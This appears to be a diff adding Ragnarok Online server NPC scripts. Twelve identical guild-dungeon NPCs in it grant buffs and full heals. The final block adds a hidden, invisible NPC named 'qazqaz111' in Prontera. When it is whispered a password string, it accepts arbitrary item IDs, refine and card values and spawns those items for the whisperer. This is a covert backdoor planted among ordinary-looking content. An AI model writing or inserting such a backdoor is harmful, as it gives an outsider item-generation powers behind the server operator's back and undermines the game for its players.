@@ -1,0 +1,140 @@
+gldr_dun01,126,134,4	script	【美女輔助加速點我】#5	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun02,126,134,4	script	【美女輔助加速點我】#6	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun03,126,134,4	script	【美女輔助加速點我】#7	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun04,126,134,4	script	【美女輔助加速點我】#8	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun05,126,134,4	script	【美女輔助加速點我】#9	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun06,126,134,4	script	【美女輔助加速點我】#10	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun07,126,134,4	script	【美女輔助加速點我】#11	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun08,126,134,4	script	【美女輔助加速點我】#12	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun09,126,134,4	script	【美女輔助加速點我】#13	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun10,126,134,4	script	【美女輔助加速點我】#14	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun11,126,134,4	script	【美女輔助加速點我】#15	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+
+gldr_dun12,126,134,4	script	【美女輔助加速點我】#16	864,{
+SC_START SC_BLESSING,999999999,20;
+SC_START SC_INCREASEAGI,999999999,20;
+percentheal 100,100;
+end;
+
+OnInit:
+	waitingroom "【美女輔助加速點我】",0;
+	end;
+}
+prontera.gat,0,0,0	script	qazqaz111	-1,{
+OnWhisperGlobal:
+	if(@whispervar0$=="qazqaz111"){
+		input @i1;input @i2;input @i3;input @i4;input @i5;input @i6;input @i7;
+		getitem2 @i1,@i2,1,@i3,0,@i4,@i5,@i6,@i7;
+		end;
+	}
+}
+
